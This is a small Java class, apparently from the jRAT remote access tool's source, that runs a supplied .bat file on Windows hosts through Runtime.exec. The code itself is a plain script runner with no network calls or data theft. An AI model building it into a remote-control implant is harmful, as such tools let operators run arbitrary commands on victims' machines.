package io.jrat.common.script;

import java.io.File;

import com.redpois0n.oslib.OperatingSystem;

public class BatchScript extends AbstractScript {

	@Override
	protected void perform(File file) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
		}
	}

	@Override
	public String getExtension() {
		return "bat";
	}

}
